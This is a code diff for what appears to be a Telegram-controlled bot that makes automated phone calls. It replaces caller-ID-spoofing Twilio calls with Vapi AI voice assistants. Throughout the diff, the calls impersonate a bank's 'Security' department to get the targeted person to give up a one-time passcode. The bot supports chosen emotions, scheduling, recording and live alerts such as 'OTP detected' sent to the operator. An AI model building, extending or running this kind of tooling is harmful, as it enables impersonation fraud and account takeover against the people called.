@@ -2604,89 +2604,109 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
 
         def _start():
             try:
+                from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
+                from services.prompt_builder import PromptBuilder
+                from services.vapi_service import create_call
                 
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 voice_id = read_user_file(user_id_str, "Voice.txt", DEFAULT_VOICE_ID)
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
+                language = (read_user_file(user_id_str, "Language.txt", "en") or "en").upper()
+                delivery = (read_user_file(user_id_str, "Delivery.txt", "sms") or "sms").upper()
                 
-                sid = make_spoofed_call(
-                    to=phonenum,
-                    from_number=OUTBOUND_CALLER_ID,
-                    caller_id=caller_id,
-                    user_id=user_id_str,
-                    chat_id=chat_id,
-                    call_record=True,
-                    code_length=code_length,
+                # Build Vapi call metadata with emotion context
+                target = TargetInfo(
+                    name=name,
+                    phone=phonenum,
+                    customer_type="customer",
+                    relationship="customer",
+                )
+                company_info = CompanyInfo(
+                    name=company,
+                    department="Security",
+                    representative_name=company,
+                )
+                otp_config = OTPConfig(
+                    length=int(code_length) if code_length.isdigit() else 6,
+                    delivery_method=delivery.lower() or "sms",
+                )
+                ai_behavior = AIBehavior(
+                    voice_provider="vapi",
+                    voice_id=voice_id,
+                    language=language.lower() or "en",
                     emotion=emotion,
                 )
-                if not sid:
-                    raise Exception("Failed to create emotion call")
+                
+                metadata = CallMetadata(
+                    target=target,
+                    company=company_info,
+                    reason="verify customer identity with emotional engagement",
+                    otp=otp_config,
+                    ai=ai_behavior,
+                )
+                metadata.internal = {
+                    "user_id": user_id_str,
+                    "chat_id": chat_id,
+                    "code_length": code_length,
+                    "emotion": emotion,
+                }
 
-                resolved_sid = None
+                # Build the prompt
+                prompt_builder = PromptBuilder()
+                system_prompt = prompt_builder.build(metadata)
+
+                # Create Vapi call with emotion-aware assistant
+                vapi_call_id = create_call(
+                    customer_number=phonenum,
+                    customer_name=name,
+                    assistant_overrides={
+                        "model": {"messages": [{"role": "system", "content": system_prompt}]},
+                        "voice": {"voiceId": voice_id},
+                    },
+                    metadata=metadata.internal,
+                )
+                if not vapi_call_id:
+                    raise Exception("Failed to create Vapi emotion call")
+
+                # Register and notify
+                register_call_session(
+                    vapi_call_id,
+                    user_id_str,
+                    chat_id=chat_id,
+                    endpoint="/initiate_emotion_call",
+                    mode_label=f"AI Emotion Call ({emotion})",
+                    voice_id=voice_id,
+                    emotion=emotion,
+                    status_chat_id=chat_id,
+                    status_message_id=status_message_id,
+                )
+                
+                bot.send_message(
+                    chat_id,
+                    f"🎭 **Vapi emotion call initiated!**\n\n"
+                    f"Call ID: `{vapi_call_id}`\n"
+                    f"Target: {name}\n"
+                    f"Emotion: {emotion}\n\n"
+                    f"📍 Live updates will appear as the call progresses."
+                )
+                
                 try:
-                    if hasattr(sid, "result") and callable(getattr(sid, "result")):
-                        resolved_sid = sid.result(timeout=5)
-                    else:
-                        resolved_sid = sid
+                    clear_user_call_setup(user_id_str)
                 except Exception:
-                    resolved_sid = None
+                    logger.exception(f"Failed to clear call setup for user {user_id_str}")
+                
+                if current_hash:
+                    _write_last_setup_hash(user_id_str, current_hash)
+                
+                logger.info(f"✅ Vapi emotion call {vapi_call_id} initiated for user {user_id_str}")
+            except Exception as e:
+                try:
+                    bot.send_message(chat_id, f"❌ Failed to initiate emotion call: {e}")
+                except Exception:
+                    pass
 
-                user_obj = types.User(id=call_from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
-                if resolved_sid:
-                    register_call_session(
-                        resolved_sid,
-                        user_id_str,
-                        chat_id=chat_id,
-                        endpoint="/initiate_emotion_call",
-                        mode_label=f"AI Emotion Call ({emotion})",
-                        status_chat_id=chat_id,
-                        status_message_id=status_message_id,
-                    )
-                    store_call_metadata(user_id_str, resolved_sid, target=phonenum)
-                    live_buttons = types.InlineKeyboardMarkup(row_width=1)
-                    live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
-                    bot.send_message(chat_id, "🎯 Emotion call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
-                    try:
-                        _notify_live_listen_start(resolved_sid, chat_id, user_id_str)
-                    except Exception:
-                        pass
-                else:
-                    bot.send_message(chat_id, "🎯 Emotion call queued. You'll be notified when it starts.")
-                    try:
-                        if hasattr(sid, "add_done_callback") and callable(getattr(sid, "add_done_callback")):
-                            def _finalize_call(fut):
-                                try:
-                                    final_sid = fut.result()
-                                except Exception:
-                                    return
-                                try:
-                                    register_call_session(
-                                        final_sid,
-                                        user_id_str,
-                                        chat_id=chat_id,
-                                        endpoint="/initiate_emotion_call",
-                                        mode_label=f"AI Emotion Call ({emotion})",
-                                        status_chat_id=chat_id,
-                                        status_message_id=status_message_id,
-                                    )
-                                except Exception:
-                                    pass
-                                try:
-                                    store_call_metadata(user_id_str, final_sid, target=phonenum)
-                                except Exception:
-                                    pass
-                                try:
-                                    _notify_live_listen_start(final_sid, chat_id, user_id_str)
-                                except Exception:
-                                    pass
-                                try:
-                                    report_twilio_call_status(chat_id, final_sid, user=user_obj)
-                                except Exception:
-                                    pass
-                            sid.add_done_callback(_finalize_call)
-                    except Exception:
-                        pass
+        run_callback_async(_start)
             except Exception as e:
                 try:
                     bot.send_message(chat_id, f"❌ Failed to initiate emotion call: {e}")
@@ -2702,11 +2722,10 @@ def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotio
 
 
 def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_message_id: Optional[int] = None, mode_label: Optional[str] = None) -> None:
-    """Start a Normal Call that always uses the single ultimate script endpoints.
+    """Start a Normal Call using Vapi AI assistant with live webhook updates to Telegram.
 
-    Creates a Twilio call whose webhook points to `/focus_listen_flow` which
-    records briefly then redirects into `/normal_advanced_flow` so the single
-    ultimate script is used for all normal calls.
+    Builds call metadata from user settings, creates a Vapi call, and registers the session
+    to receive webhook events (ringing, answered, transcript, recording, ended).
     """
     if mode_label is None:
         mode_label = "Normal Call"
@@ -2731,7 +2750,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
             return
 
         caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
-        bot.send_message(chat_id, "✨ Starting Normal Call. Live listen will be available shortly.")
+        bot.send_message(chat_id, "✨ Starting Normal Call. Live updates will be available shortly.")
 
         def _start():
             try:
@@ -2769,123 +2788,120 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                 )
                 bot.send_message(chat_id, f"✨ Starting Normal Call with current setup:\n\n{setup_summary}")
 
-                
-                sid = make_spoofed_call(
-                    to=phonenum,
-                    from_number=OUTBOUND_CALLER_ID,
-                    caller_id=caller_id,
-                    user_id=user_id_str,
-                    chat_id=chat_id,
-                    call_record=True,
-                    code_length=code_length,
+                # Build Vapi call metadata from user settings
+                from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
+                from services.prompt_builder import PromptBuilder
+                from services.vapi_service import create_call
+
+                target = TargetInfo(
+                    name=name,
+                    phone=phonenum,
+                    customer_type="customer",
+                    relationship="customer",
                 )
-                if not sid:
-                    raise Exception("Failed to create normal call")
+                company_info = CompanyInfo(
+                    name=company,
+                    department="Security",
+                    representative_name=from_name or company,
+                )
+                otp_config = OTPConfig(
+                    length=int(code_length) if code_length.isdigit() else 6,
+                    delivery_method=delivery.lower() or "sms",
+                )
+                ai_behavior = AIBehavior(
+                    voice_provider="vapi",
+                    voice_id=voice_id,
+                    language=language.lower() or "en",
+                    emotion=emotion or "neutral",
+                )
+                
+                metadata = CallMetadata(
+                    target=target,
+                    company=company_info,
+                    reason="verify customer identity with OTP",
+                    otp=otp_config,
+                    ai=ai_behavior,
+                )
+                metadata.internal = {
+                    "user_id": user_id_str,
+                    "chat_id": chat_id,
+                    "code_length": code_length,
+                }
 
-                # Resolve Future if returned by the async call helper. Avoid passing
-                # a Future into JSON serialization or storage.
-                resolved_sid = None
+                # Build the prompt
+                prompt_builder = PromptBuilder()
+                system_prompt = prompt_builder.build(metadata)
+
+                # Create Vapi call with assistant overrides
+                vapi_call_id = create_call(
+                    customer_number=phonenum,
+                    customer_name=name,
+                    assistant_overrides={
+                        "model": {"messages": [{"role": "system", "content": system_prompt}]},
+                        "voice": {"voiceId": voice_id},
+                    },
+                    metadata=metadata.internal,
+                )
+                if not vapi_call_id:
+                    raise Exception("Failed to create Vapi call")
+
+                # Register the Vapi call session for webhook tracking
+                register_call_session(
+                    vapi_call_id,
+                    user_id_str,
+                    chat_id=chat_id,
+                    endpoint="/initiate_normal_call",
+                    mode_label=mode_label,
+                    voice_id=voice_id,
+                    voice_name=voice_name,
+                    name=name,
+                    company=company,
+                    from_name=from_name or company,
+                    delivery=delivery,
+                    language=language,
+                    code_length=code_length,
+                    emotion=emotion,
+                    status_chat_id=chat_id,
+                    status_message_id=status_message_id,
+                )
+
+                # Store call metadata
                 try:
-                    # Many async helpers return concurrent.futures.Future which
-                    # exposes `result` and `add_done_callback`.
-                    if hasattr(sid, "result") and callable(getattr(sid, "result")):
-                        resolved_sid = sid.result(timeout=5)
-                    else:
-                        resolved_sid = sid
+                    store_call_metadata(user_id_str, vapi_call_id, target=phonenum)
                 except Exception:
-                    resolved_sid = None
+                    logger.exception("Failed to store call metadata")
 
-                def _on_future_done(fut):
-                    try:
-                        final_sid = fut.result()
-                    except Exception:
-                        return
-                    try:
-                        store_call_metadata(user_id_str, final_sid, target=phonenum)
-                    except Exception:
-                        logger.exception("Failed to store call metadata in future callback")
-                    try:
-                        try:
-                            _notify_live_listen_start(final_sid, chat_id, user_id_str)
-                        except Exception:
-                            pass
-                    except Exception:
-                        pass
+                # Send confirmation to user with live updates notice
+                confirmation_text = (
+                    f"🎯 **Vapi call initiated!**\n\n"
+                    f"Call ID: `{vapi_call_id}`\n"
+                    f"Target: {name}\n"
+                    f"Number: {phonenum}\n\n"
+                    f"📍 Live updates will appear below as the call progresses:\n"
+                    f"• 🔔 Ringing\n"
+                    f"• ✅ Answered\n"
+                    f"• 💬 Transcript updates\n"
+                    f"• 🔐 OTP detected\n"
+                    f"• 🎙️ Recording saved\n"
+                    f"• ✋ Call ended"
+                )
+                bot.send_message(chat_id, confirmation_text, parse_mode="Markdown")
 
-                # If we have a concrete SID, proceed to store, notify, and track status.
-                user_obj = types.User(id=call_from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
-                if resolved_sid:
-                    register_call_session(
-                        resolved_sid,
-                        user_id_str,
-                        chat_id=chat_id,
-                        endpoint="/initiate_normal_call",
-                        mode_label=mode_label,
-                        status_chat_id=chat_id,
-                        status_message_id=status_message_id,
-                    )
-                    store_call_metadata(user_id_str, resolved_sid, target=phonenum)
-                    live_buttons = types.InlineKeyboardMarkup(row_width=1)
-                    live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
-                    bot.send_message(chat_id, "🎯 Normal call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
-                    # Clear per-user call setup immediately after initiating the call
-                    try:
-                        clear_user_call_setup(user_id_str)
-                    except Exception:
-                        logger.exception(f"Failed to clear call setup after start for user {user_id_str}")
-                    try:
-                        # Record the setup hash used for this initiated call so it cannot
-                        # be reused after the call completes.
-                        if current_hash:
-                            _write_last_setup_hash(user_id_str, current_hash)
-                    except Exception:
-                        logger.exception("Failed to record last setup hash")
-                    try:
-                        _notify_live_listen_start(resolved_sid, chat_id, user_id_str)
-                    except Exception:
-                        pass
-                else:
-                    # Sid is not yet available (pending Future). Attach a callback if possible
-                    try:
-                        if hasattr(sid, "add_done_callback") and callable(getattr(sid, "add_done_callback")):
-                            def _finalize_call(fut):
-                                try:
-                                    final_sid = fut.result()
-                                except Exception:
-                                    return
-                                try:
-                                    register_call_session(
-                                        final_sid,
-                                        user_id_str,
-                                        chat_id=chat_id,
-                                        endpoint="/initiate_normal_call",
-                                        mode_label=mode_label,
-                                        status_chat_id=chat_id,
-                                        status_message_id=status_message_id,
-                                    )
-                                except Exception:
-                                    pass
-                                try:
-                                    store_call_metadata(user_id_str, final_sid, target=phonenum)
-                                except Exception:
-                                    logger.exception("Failed to store call metadata in future callback")
-                                try:
-                                                _notify_live_listen_start(final_sid, chat_id, user_id_str)
-                                except Exception:
-                                    pass
-                                try:
-                                    report_twilio_call_status(chat_id, final_sid, user=user_obj)
-                                except Exception:
-                                    pass
-                            sid.add_done_callback(_finalize_call)
-                    except Exception:
-                        logger.exception("Failed to attach done-callback to call future")
-                    bot.send_message(chat_id, "🎯 Normal call queued. You'll be notified when the call starts.")
-                    # Clear per-user call setup for queued calls as well
-                    try:
-                        clear_user_call_setup(user_id_str)
-                    except Exception:
-                        logger.exception(f"Failed to clear call setup after queuing for user {user_id_str}")
+                # Clear per-user call setup immediately after initiating the call
+                try:
+                    clear_user_call_setup(user_id_str)
+                except Exception:
+                    logger.exception(f"Failed to clear call setup after start for user {user_id_str}")
+
+                # Record the setup hash used for this initiated call so it cannot
+                # be reused after the call completes.
+                try:
+                    if current_hash:
+                        _write_last_setup_hash(user_id_str, current_hash)
+                except Exception:
+                    logger.exception("Failed to record last setup hash")
+
+                logger.info(f"✅ Vapi call {vapi_call_id} initiated for user {user_id_str} to {phonenum}")
             except Exception as e:
                 try:
                     bot.send_message(chat_id, f"❌ Failed to initiate normal call: {e}")
@@ -2905,38 +2921,93 @@ def _execute_single_schedule(sched, user_id, schedule_path, schedules):
         phone = sched["phone"]
         schedule_type = sched.get("type", "voice")
         chat_id = sched.get("chat_id")
+        
+        from models.call_metadata import CallMetadata, TargetInfo, CompanyInfo, OTPConfig, AIBehavior
+        from services.prompt_builder import PromptBuilder
+        from services.vapi_service import create_call
+        
         if schedule_type in ("manual", "custom"):
             params = sched.get("manual_params" if schedule_type == "manual" else "custom_params", {}) or {}
-            caller_id = params.get("caller_id") or TWILIO_PHONE_NUMBER
             script = params.get("script", "").strip()
-            voice_id = str(params.get("voice_id", "")).strip() or read_user_file(user_id, "Voice.txt", TWILIO_PHONE_NUMBER)
+            voice_id = str(params.get("voice_id", "")).strip() or read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
             emotion = params.get("emotion", "neutral") or "neutral"
             code_length = str(params.get("code_length", "6") or "6")
-            mode_label = "Manual Call" if schedule_type == "manual" else "Custom Call"
-            sid = make_spoofed_call(
-                to=phone,
-                from_number=OUTBOUND_CALLER_ID,
-                caller_id=caller_id,
-                user_id=user_id,
-                chat_id=chat_id,
-                call_record=True,
-                code_length=code_length,
+            
+            name = params.get("name") or read_user_file(user_id, "Name.txt", "Customer")
+            company = params.get("company") or read_user_file(user_id, "Company Name.txt", "your bank")
+            
+            target = TargetInfo(name=name, phone=phone)
+            company_info = CompanyInfo(name=company)
+            otp_config = OTPConfig(length=int(code_length) if code_length.isdigit() else 6)
+            ai_behavior = AIBehavior(voice_provider="vapi", voice_id=voice_id, emotion=emotion)
+            
+            metadata = CallMetadata(
+                target=target,
+                company=company_info,
+                reason="verify customer identity",
+                otp=otp_config,
+                ai=ai_behavior,
                 custom_instructions=script or None,
+            )
+            metadata.internal = {"user_id": user_id, "chat_id": chat_id}
+            
+            prompt_builder = PromptBuilder()
+            system_prompt = prompt_builder.build(metadata)
+            
+            vapi_call_id = create_call(
+                customer_number=phone,
+                customer_name=name,
+                assistant_overrides={
+                    "model": {"messages": [{"role": "system", "content": system_prompt}]},
+                    "voice": {"voiceId": voice_id},
+                },
+                metadata=metadata.internal,
             )
         else:
             emotion = sched.get("emotion", "neutral")
-            sid = make_spoofed_call(
-                to=phone,
-                from_number=OUTBOUND_CALLER_ID,
-                caller_id=read_user_file(user_id, "Caller ID.txt", TWILIO_PHONE_NUMBER),
-                user_id=user_id,
-                chat_id=chat_id,
-                code_length=read_user_file(user_id, "CodeLength.txt", "6"),
+            name = read_user_file(user_id, "Name.txt", "Customer")
+            company = read_user_file(user_id, "Company Name.txt", "your bank")
+            voice_id = read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
+            code_length = read_user_file(user_id, "CodeLength.txt", "6")
+            
+            target = TargetInfo(name=name, phone=phone)
+            company_info = CompanyInfo(name=company)
+            otp_config = OTPConfig(length=int(code_length) if code_length.isdigit() else 6)
+            ai_behavior = AIBehavior(voice_provider="vapi", voice_id=voice_id, emotion=emotion)
+            
+            metadata = CallMetadata(
+                target=target,
+                company=company_info,
+                reason="verify customer identity",
+                otp=otp_config,
+                ai=ai_behavior,
             )
-        if sid:
+            metadata.internal = {"user_id": user_id, "chat_id": chat_id}
+            
+            prompt_builder = PromptBuilder()
+            system_prompt = prompt_builder.build(metadata)
+            
+            vapi_call_id = create_call(
+                customer_number=phone,
+                customer_name=name,
+                assistant_overrides={
+                    "model": {"messages": [{"role": "system", "content": system_prompt}]},
+                    "voice": {"voiceId": voice_id},
+                },
+                metadata=metadata.internal,
+            )
+        
+        if vapi_call_id:
+            register_call_session(
+                vapi_call_id,
+                user_id,
+                chat_id=chat_id,
+                endpoint="/schedule",
+                mode_label=f"Scheduled {schedule_type.title()} Call",
+            )
             sched["status"] = "completed"
-            sched["sid"] = sid
-            logger.info(f"Scheduled call executed: {phone} -> {sid}")
+            sched["sid"] = vapi_call_id
+            logger.info(f"Scheduled call executed (Vapi): {phone} -> {vapi_call_id}")
         else:
             sched["status"] = "failed"
     except Exception as e:
